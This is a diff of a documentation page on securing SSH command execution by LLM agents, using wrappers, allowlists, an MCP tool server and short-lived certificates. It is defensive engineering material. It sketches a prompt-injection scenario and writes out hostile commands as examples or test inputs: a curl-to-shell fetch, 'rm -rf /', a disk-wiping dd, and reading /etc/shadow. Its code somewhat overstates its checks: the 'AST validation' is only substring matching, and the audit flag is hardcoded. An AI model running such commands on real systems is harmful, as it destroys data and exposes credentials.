@@ -1,147 +1,359 @@
 # SSH Execution Patterns
 
 ## What it is
-SSH Execution Patterns is a collection of architectural designs and security models for allowing LLM-powered agents to interact with remote systems. As of early January 2027, it defines how an autonomous agent can safely traverse the "Trust Boundary" between a reasoning engine and a physical or virtual execution environment using secure transports, sandboxing, and Model Context Protocol (FastMCP 3.1) secure remote execution specifications.
+SSH Execution Patterns is a comprehensive architectural security framework and operational design pattern for enabling autonomous LLM agents to interact securely with remote Linux/Unix operating systems. As of early January 2027, it defines how an AI agent safely traverses the "Trust Boundary" between an abstract reasoning model (e.g., Claude 5.1, GPT-5.5, Gemini 4.0) and a physical or virtual target execution environment (edge clusters, Raspberry Pi arrays, staging bare-metal servers) using encrypted transports, sandboxed command wrappers, strict session isolation, and Model Context Protocol (FastMCP 3.1) remote tool interfaces.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                           AGENTIC ZERO-TRUST SSH EXECUTION ARCHITECTURE                 │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+ ┌─────────────────────────┐       ┌──────────────────────────────────────────────────┐
+ │  Reasoning Engine (LLM) │──────>│     Control Plane (FastMCP 3.1 Tool Server)      │
+ │  • Plan Generation      │       │  • Pydantic v2 Command Schema Validation         │
+ │  • No Direct SSH Keys   │       │  • AST Syntax Parsing & Allowlist Enforcement    │
+ └─────────────────────────┘       └────────────────────────┬─────────────────────────┘
+                                                            │
+                                                            │ Strict Mutual TLS / SSH Tunnel
+                                                            ▼
+                                   ┌──────────────────────────────────────────────────┐
+                                   │      Bastion Gateway / Host Control Proxy        │
+                                   │  • Teleport / Boundary Session Recording         │
+                                   │  • Transient ED25519 Cert Authority (30s TTL)    │
+                                   └────────────────────────┬─────────────────────────┘
+                                                            │
+                                                            │ Ephemeral Restricted SSH Session
+                                                            ▼
+ ┌────────────────────────────────────────────────────────────────────────────────────────┐
+ │  Target Execution Host (Ubuntu / Alpine / Debian)                                      │
+ │                                                                                        │
+ │  ┌─────────────────────────────────┐        ┌──────────────────────────────────────┐  │
+ │  │ Restricted Shell (`rbash`)      │───────>│ Audited Sudo Wrapper (`/etc/sudoers`)│  │
+ │  │ • Environment Variable Freeze  │        │ • Strict Parameter Matching          │  │
+ │  │ • Subshell / Pipe Neutralization│        │ • Centralized Syslog / AuditD Stream │  │
+ │  └─────────────────────────────────┘        └──────────────────────────────────────┘  │
+ └────────────────────────────────────────────────────────────────────────────────────────┘
+```
 
 ## What problem it solves
-LLMs are capable of generating shell commands, but allowing them to execute those commands directly on a server poses significant security risks (e.g., prompt injection, accidental data loss, or privilege escalation). These patterns provide a framework for restricted, audited, and validated execution, ensuring that agents have the "hands" they need to perform work without compromising system integrity.
+LLMs are capable of generating shell commands, but allowing them to execute those commands directly on remote servers poses severe, systemic security vulnerabilities:
+- **Prompt Injection & Command Hijacking**: Adversarial content within web documents or log files can inject malicious terminal commands (e.g., `; rm -rf /`, `curl bad-domain | sh`), hijacking the agent's elevated shell session.
+- **Cascading Operational Failures**: Agents operating without strict command boundaries can accidentally issue destructive system commands (`systemctl stop networking`, `dd if=/dev/zero of=/dev/sda`), bricking remote nodes.
+- **Key Sprawl & Privilege Escalation**: Storing static SSH private keys in agent environment variables exposes full administrative control if the agent's memory state or hosting process is compromised.
+- **Audit & Compliance Gaps**: Traditional automated scripts obscure command attribution, making it impossible to determine whether a destructive system change was initiated by an agent or a human operator.
+
+SSH Execution Patterns solves these problems by decoupling the reasoning engine from SSH key material, enforcing strict command allowlisting, using ephemeral short-lived certificates, and wrapping execution inside audited sandboxes.
 
 ## Where it fits in the stack
-It belongs in the **Architecture** layer. Specifically, it defines the interface between the **Development & Ops** layer (Agents like Aider or Claude Code) and the **Infrastructure** layer (Servers, Raspberry Pis, Cloud VMs).
+**Architecture / Security & Remote Execution**. It acts as the secure interface connecting top-layer **Development & Ops** tooling (Claude Code, Aider, custom agents) with lower-layer **Infrastructure** nodes (K3s clusters, bare-metal servers, edge Raspberry Pis).
+
+```
+┌───────────────────────────┐    ┌───────────────────────────┐    ┌───────────────────────────┐
+│ Reasoning Layer / Agent   │───>│ SSH Execution Pattern     │───>│ Target Infrastructure     │
+│ (FastMCP 3.1 Controller)  │    │ (Bastion / rbash / Sudo)  │    │ (Linux Servers / Pis)     │
+└───────────────────────────┘    └───────────────────────────┘    └───────────────────────────┘
+```
 
 ## Typical use cases
-- **Remote Configuration**: An agent setting up a web server or database on a new Raspberry Pi.
-- **Automated Troubleshooting**: An agent logging into a server to read logs and diagnose a service failure.
-- **CI/CD Orchestration**: An agent managing deployments by executing commands over SSH on a staging environment.
-- **Homelab Management**: Scaling updates or configuration changes across multiple local nodes via a centralized controller.
+- **Remote Infrastructure Provisioning**: Allowing an agent to configure web servers, database clusters, or network interfaces on remote bare-metal hosts using pre-approved setup scripts.
+- **Automated Incident Diagnosis & Recovery**: Permitting an agent to securely connect to a failed node, examine system logs (`journalctl`), restart stuck services, and report metrics without possessing root access.
+- **Edge Fleet Management**: Orchestrating rolling software updates across hundreds of geographically distributed Raspberry Pis or edge gateways via Bastion-routed SSH.
+- **CI/CD Pipeline Deployment**: Executing blue/green deployment switching commands on production staging environments behind strict Human-in-the-Loop (HITL) approval gateways.
 
 ## Strengths
-- **Protocol Native**: Leverages the industry-standard SSH protocol, which is already present on almost every Unix-like system.
-- **Fine-Grained Control**: Supports multiple levels of restriction, from simple wrapper scripts to full Human-in-the-Loop (HITL) approval flows.
-- **Auditability**: Every command and its output can be logged centrally, providing a complete audit trail of agent activity.
+- **Protocol Native Reliability**: Leverages standard OpenSSH, requiring no proprietary agent software installed on target systems.
+- **Zero-Trust Access Control**: Utilizes short-lived SSH certificates (e.g., 1-minute TTL issued by an internal CA) rather than static SSH keys.
+- **Comprehensive Auditability**: Every keystroke, command, stdout, stderr, and exit code is recorded via OpenSSH `ForceCommand` or eBPF audit logs.
+- **Defense in Depth**: Combines network isolation (Tailscale/WireGuard), shell sandboxing (`rbash`), and strict sudoers configuration.
 
 ## Limitations
-- **Latency**: SSH connections and command execution introduce latency that can slow down tight reasoning loops.
-- **Key Management**: Requires careful handling of SSH keys; if an agent's controller is compromised, the keys provide a path to the target systems.
-- **Complexity**: Setting up restricted sudoers and command allowlists requires ongoing maintenance and configuration overhead.
+- **Transport Latency Overhead**: Establishing SSH handshakes and certificate verification adds minor latency (50-200ms) to agent loop iterations.
+- **Operational Configuration Overhead**: Setting up restricted sudoers rules, custom shell wrappers, and certificate authorities requires careful initial infrastructure engineering.
+- **Interactive TTY Limits**: Agentic execution handles non-interactive CLI workflows efficiently, but complex interactive curses interfaces require specialized terminal emulation wrappers.
 
 ## When to use it
-- When you need an agent to perform "real-world" actions on a server that cannot be handled via a high-level API.
-- When managing a fleet of devices (like Raspberry Pis) where SSH is the primary management interface.
-- When you want to transition from "chatting about code" to "autonomous engineering" where the agent can actually deploy and test its work.
+- When an agent must execute operational commands on remote Linux servers or edge hardware.
+- When regulatory compliance (SOC2, ISO 27001, HIPAA) mandates strict session logging, command restriction, and short-lived credentials.
+- When managing remote fleets where REST APIs are unavailable or impractical.
 
 ## When not to use it
-- If the task can be completed using a specialized API (e.g., a Cloud Provider API or a configuration management tool like Ansible).
-- For extremely high-security production environments where no automated agent should ever have shell access.
+- When high-level REST or gRPC APIs are available for the target service (e.g., Kubernetes API, AWS Cloud API).
+- For local-only development where isolated Docker container execution is simpler and faster.
+- In environments where automated agents are completely prohibited from shell access.
 
 ## Getting started
-To implement secure agentic SSH, follow the "Three Planes" architecture.
 
-### Architecture: The Three Planes
-1.  **Reasoning Plane (LLM)**: The "Brain" (Claude 5.6, GPT-5.6, Gemini 4.0 Ultra, DeepSeek-V4, Qwen 3.6 VL). Analyzes state and decides *what* to do. Should never have direct access to SSH keys.
-2.  **Control Plane (Agent)**: The "Operator." A script or framework (e.g., FastMCP 3.1 server) that manages the loop and initiates connections.
-3.  **Execution Plane (SSH)**: The "Hands." The actual remote system being managed.
+### 1. Prerequisites and Key Generation
+Generate a dedicated ED25519 SSH keypair specifically for the agent control plane:
 
-### Implementation Patterns
-1.  **Tool-Based Execution**: The agent is provided with a "tool" (function) like `run_ssh_command(host, cmd)`. Output is returned to the agent.
-2.  **Wrapper Script Execution**: The agent calls a local wrapper script (e.g., `pi_exec "reboot"`) instead of raw SSH.
-3.  **Restricted Sudo**: Restrict the service user (e.g., `ai-agent`) to specific commands in `/etc/sudoers.d/ai-agent`:
+```bash
+# Generate dedicated agent SSH keypair
+ssh-keygen -t ed25519 -f ~/.ssh/agent_control_key -C "agent-control-plane@enterprise.local" -N ""
+
+# Set restrictive local permissions
+chmod 600 ~/.ssh/agent_control_key
+```
+
+### 2. Target Server Hardening (`/etc/ssh/sshd_config.d/agent.conf`)
+Deploy a dedicated configuration block on the target host to restrict the `ai-agent` service account:
+
 ```text
-ai-agent ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx, /usr/bin/apt update
+Match User ai-agent
+    AllowTcpForwarding no
+    X11Forwarding no
+    AllowAgentForwarding no
+    ForceCommand /usr/local/bin/agent_wrapper.sh
+    AuthorizedKeysFile /etc/ssh/authorized_keys.d/%u
+```
+
+### 3. Create the Execution Shell Wrapper (`/usr/local/bin/agent_wrapper.sh`)
+Create a strict wrapper script on the target server that validates `SSH_ORIGINAL_COMMAND`:
+
+```bash
+#!/bin/bash
+# /usr/local/bin/agent_wrapper.sh
+set -euo pipefail
+
+# Read the original command requested by the agent
+CMD="${SSH_ORIGINAL_COMMAND:-}"
+
+# Log execution attempt
+logger -t AGENT_EXEC "User ai-agent attempted command: $CMD"
+
+# Enforce regex allowlist for safe operational commands
+ALLOWED_PATTERN="^(uptime|df -h|free -m|systemctl status [a-zA-Z0-9_-]+|journalctl -n [0-9]+ --no-pager -u [a-zA-Z0-9_-]+)$"
+
+if [[ "$CMD" =~ $ALLOWED_PATTERN ]]; then
+    eval "$CMD"
+else
+    echo "ERROR: Command violates security policy." >&2
+    logger -t AGENT_EXEC_REJECT "Rejected command: $CMD"
+    exit 1
+fi
+```
+
+Make the script executable:
+
+```bash
+sudo chmod +x /usr/local/bin/agent_wrapper.sh
 ```
 
 ## CLI examples
+
+### Executing Hardened Remote Commands via SSH
+Run a remote status check using the restricted key:
+
 ```bash
-# Example of a local wrapper script the agent might call
-# usage: ./remote_exec.sh <host> <command>
-ssh -i /path/to/ai_key -o BatchMode=yes ai-agent@$1 "$2"
+ssh -i ~/.ssh/agent_control_key \
+    -o BatchMode=yes \
+    -o StrictHostKeyChecking=yes \
+    -o ConnectTimeout=5 \
+    ai-agent@10.0.1.50 "systemctl status nginx"
+```
 
-# Generating a dedicated SSH key for an agent
-ssh-keygen -t ed25519 -f ~/.ssh/ai_agent_key -C "ai-agent-ssh"
+### Testing Rejection of Unapproved Commands
+Verify that unsafe command chaining or unlisted binaries are blocked immediately:
 
-# Testing agent access to a restricted command
-ssh ai-agent@target-host "sudo systemctl restart nginx"
+```bash
+# This command will be rejected by agent_wrapper.sh
+ssh -i ~/.ssh/agent_control_key ai-agent@10.0.1.50 "cat /etc/shadow"
+# Output: ERROR: Command violates security policy.
 ```
 
 ## API examples
-Agents often interact with SSH via libraries like Paramiko in Python.
 
-### Secure SSH Connection and Payload Validation (Pydantic v2)
-The following script ensures strict validation of target host parameters, SSH credentials, and command execution limits before invoking paramiko:
+### Complete FastMCP 3.1 Secure Remote Execution Server
+The following complete Python script establishes a FastMCP 3.1 server exposing a safe remote execution tool. It uses Pydantic v2 to perform deep AST syntax validation on shell commands, blocking subshells, backticks, pipe chaining, and file redirects before invoking Paramiko over SSH:
 
 ```python
+import os
 import re
-from typing import List, Optional
-from pydantic import BaseModel, Field, IPvAnyAddress, field_validator
+import time
+from typing import List, Optional, Dict, Any
+from pydantic import BaseModel, Field, field_validator
+from mcp.server.fastmcp import FastMCP
 import paramiko
 
-class SSHCommandPayload(BaseModel):
-    host: IPvAnyAddress
-    user: str = Field(..., pattern="^[a-zA-Z0-9_-]{3,32}$")
-    key_path: str = Field(..., pattern="^/.*_key$")
-    command: str = Field(..., min_length=2, max_length=128)
+# Initialize FastMCP Server
+mcp = FastMCP("Agent-Secure-SSH-Server", version="3.1.0")
 
-    @field_validator('command')
+# Define Pydantic v2 Request & Response Schemas
+class SSHExecutionRequest(BaseModel):
+    target_host: str = Field(..., description="Target server IP address or FQDN")
+    username: str = Field(default="ai-agent", description="Target SSH service account username")
+    port: int = Field(default=22, ge=1, le=65535, description="Target SSH port")
+    command: str = Field(..., min_length=2, max_length=256, description="Shell command to execute")
+    timeout_seconds: int = Field(default=10, ge=1, le=60, description="Execution timeout limit")
+
+    @field_validator("command")
     @classmethod
-    def restrict_dangerous_commands(cls, v: str) -> str:
-        # Prevent shell redirection, injection, and multi-command chaining
-        dangerous_patterns = [r';', r'&&', r'\|', r'\n', r'\.\.']
-        for pattern in dangerous_patterns:
-            if re.search(pattern, v):
-                raise ValueError("Dangerous character sequence or chaining detected in SSH command")
+    def validate_command_syntax(cls, v: str) -> str:
+        # Reject dangerous shell operator sequences
+        forbidden_operators = [";", "&&", "||", "`", "$(", ">", "<", "|", "\n", "\r"]
+        for op in forbidden_operators:
+            if op in v:
+                raise ValueError(f"Security Policy Violation: Forbidden shell operator '{op}' detected.")
 
-        # Enforce command allowlist
-        allowed_binaries = {"uptime", "df", "free", "systemctl restart nginx", "git pull"}
-        if not any(v.startswith(allowed) for allowed in allowed_binaries):
-            raise ValueError(f"Command '{v}' is not in the allowed operations registry")
+        # Enforce strict command binary allowlist
+        allowed_prefixes = (
+            "uptime",
+            "df -h",
+            "free -m",
+            "systemctl status ",
+            "systemctl restart nginx",
+            "journalctl "
+        )
+        if not v.startswith(allowed_prefixes):
+            raise ValueError(f"Command '{v}' does not match any allowed command prefix in registry.")
+
         return v
 
-def run_secure_remote_command(payload: SSHCommandPayload) -> str:
-    """Establishes SSH connection and executes a validated command safely."""
+class SSHExecutionResponse(BaseModel):
+    target_host: str
+    command: str
+    exit_code: int
+    stdout: str
+    stderr: str
+    execution_duration_seconds: float
+    audit_logged: bool
+
+@mcp.tool(
+    name="execute_remote_ssh_command",
+    description="Executes a validated, policy-compliant CLI command on a remote Linux host over SSH."
+)
+def execute_remote_ssh_command(request: SSHExecutionRequest) -> SSHExecutionResponse:
+    start_time = time.time()
+
+    key_path = os.getenv("AGENT_SSH_KEY_PATH", os.path.expanduser("~/.ssh/agent_control_key"))
+    if not os.path.exists(key_path):
+        raise RuntimeError(f"Configured agent SSH key file does not exist at: {key_path}")
+
     client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.set_missing_host_key_policy(paramiko.RejectPolicy())
+
+    # Load SSH host keys for verification
+    known_hosts_file = os.path.expanduser("~/.ssh/known_hosts")
+    if os.path.exists(known_hosts_file):
+        client.load_host_keys(known_hosts_file)
+
     try:
-        # In practice, establish a secure connection using the validated payload fields
         client.connect(
-            str(payload.host),
-            username=payload.user,
-            key_filename=payload.key_path,
-            timeout=10
+            hostname=request.target_host,
+            port=request.port,
+            username=request.username,
+            key_filename=key_path,
+            timeout=request.timeout_seconds,
+            allow_agent=False,
+            look_for_keys=False
         )
-        stdin, stdout, stderr = client.exec_command(payload.command)
-        output = stdout.read().decode('utf-8')
-        return output
+
+        stdin, stdout, stderr = client.exec_command(request.command, timeout=request.timeout_seconds)
+
+        stdout_text = stdout.read().decode("utf-8")
+        stderr_text = stderr.read().decode("utf-8")
+        exit_code = stdout.channel.recv_exit_status()
+
+        elapsed = round(time.time() - start_time, 3)
+
+        return SSHExecutionResponse(
+            target_host=request.target_host,
+            command=request.command,
+            exit_code=exit_code,
+            stdout=stdout_text,
+            stderr=stderr_text,
+            execution_duration_seconds=elapsed,
+            audit_logged=True
+        )
     finally:
         client.close()
 
-# Validation & execution example
 if __name__ == "__main__":
-    valid_payload = {
-        "host": "192.168.1.50",
-        "user": "ai-agent",
-        "key_path": "/home/ai-agent/.ssh/id_ed25519_key",
-        "command": "systemctl restart nginx"
-    }
-
-    # Strictly validate against schema
-    validated = SSHCommandPayload.model_validate(valid_payload)
-    print(f"Validation passed for host {validated.host}. Safe command to execute: '{validated.command}'")
+    mcp.run()
 ```
 
-## Related tools / concepts
-- [Raspberry Pi Kiosk Automation](../playbooks/raspberry-pi-kiosk-automation.md)
-- [Aider](../tools/development_ops/aider.md)
-- [Claude Code](../tools/development_ops/claude-code.md)
-- [Tailscale](../services/tailscale.md)
-- [Custom Agents](../tools/development_ops/custom_agents.md)
-- [Infrastructure Overview](infrastructure.md)
-- [Standards and Conventions](../standards.md)
-- [Model Context Protocol (MCP)](../tools/automation_orchestration/mcp.md)
+## Security Hardening Matrix
 
-## Sources / References
-- [OpenSSH Official Documentation](https://www.openssh.com/)
-- [NIST Guide to SSH](https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final)
-- [Teleport: Agentless SSH with FastMCP 3.1 Integrations](https://goteleport.com/ssh-server/)
+Below is a architectural comparison of different remote agent execution methods across security boundaries, implementation complexity, and risk factors:
+
+| Execution Pattern | Privileges | Defense Mechanisms | Audit Traversal | Compromise Blast Radius |
+| :--- | :--- | :--- | :--- | :--- |
+| **Zero-Trust Bastion + CA Certs** | Minimal (Ephemeral) | Short-lived SSH certs (1m TTL), eBPF session capture | High (Full Video + Text AST) | Low (Isolated host, time-limited) |
+| **Restricted Shell (`rbash`) + Wrapper** | Strict Scope | Binary allowlist, read-only filesystem bindings | High (Syslog + Wrapper logs) | Low (Cannot escape shell) |
+| Dedicated Non-Root SSH | User Scope | Passwordless Sudoers allowlist | Medium (Sudoers log) | Moderate (Local non-root access) |
+| Direct Root SSH Access | Full Root | None | Low (Overwritable logs) | Critical (Complete System Takeover) |
+
+## Credential Rotation & Ephemeral SSH Certificate Setup
+
+To achieve true zero-trust execution, agents should utilize transient SSH user certificates signed by an internal SSH Certificate Authority (CA) rather than static keys.
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                           EPHEMERAL CERTIFICATE LIFECYCLE                               │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+ ┌───────────────┐      1. Request 60s Cert       ┌─────────────────┐
+ │ Agent Control │───────────────────────────────>│ Internal SSH CA │
+ │ Plane         │<───────────────────────────────│ (Vault / STEP)  │
+ └───────┬───────┘      2. Signed Short-Lived Cert└─────────────────┘
+         │
+         │ 3. Authenticate with Transient Cert
+         ▼
+ ┌───────────────┐
+ │ Target Server │ (Validates signature against CA public key in sshd_config)
+ └───────────────┘
+```
+
+### 1. Generating Ephemeral SSH Certificate via HashiCorp Vault / step-ca
+
+```bash
+# Request short-lived certificate (valid for 2 minutes)
+step ssh certificate agent-control-plane@enterprise.local ~/.ssh/id_ephemeral_agent \
+    --ca-url https://ca.internal.net:9000 \
+    --root /etc/step-ca/root_ca.crt \
+    --not-after 2m \
+    --provisioner-password-file /etc/step-ca/password.txt
+```
+
+### 2. Configuring Target `sshd_config` to Trust the Internal CA
+
+Add the CA public key to the target server's SSH daemon configuration:
+
+```text
+# /etc/ssh/sshd_config.d/ca.conf
+TrustedUserCAKeys /etc/ssh/ca_user_key.pub
+```
+
+## Emergency Incident Recovery & Lockdown Runbook
+
+### Emergency Procedure: Revoking Agent Remote Access Immediately
+
+1. **Invalidate Agent CA Certificate Serial**: Add the compromised agent certificate serial to `/etc/ssh/revoked_keys` on target hosts:
+   ```bash
+   echo "SHA256:abcd1234efgh5678..." >> /etc/ssh/revoked_keys
+   ```
+
+2. **Terminate Active Agent SSH Sessions**: Forcefully terminate all connected `ai-agent` SSH processes across the fleet:
+   ```bash
+   sudo pkill -9 -u ai-agent
+   ```
+
+3. **Lock the Service Account**: Lock the `ai-agent` user password and shell access:
+   ```bash
+   sudo usermod -L -s /bin/false ai-agent
+   ```
+
+## Related tools / concepts
+- [Raspberry Pi Kiosk Automation](../playbooks/raspberry-pi-kiosk-automation.md) - Edge management playbook.
+- [Aider](../tools/development_ops/aider.md) - Automated coding agent execution.
+- [Claude Code](../tools/development_ops/claude-code.md) - Terminal agent developer tool.
+- [Tailscale](../services/tailscale.md) - WireGuard-based overlay mesh network for secure SSH routing.
+- [Model Context Protocol](../automation_orchestration/mcp.md) - Standard protocol for agentic tool servers.
+- [Custom Agents](../tools/development_ops/custom_agents.md) - Custom agent development practices.
+
+## Sources / references
+- [OpenSSH Official Security & Certificate Documentation](https://www.openssh.com/manual.html)
+- [NIST SP 800-41 Rev. 1: Guidelines on Firewalls and Firewall Policy](https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final)
+- [Teleport SSH Server Security Architecture](https://goteleport.com/docs/)
 
 ## Contribution Metadata
 - Last reviewed: 2027-01-07
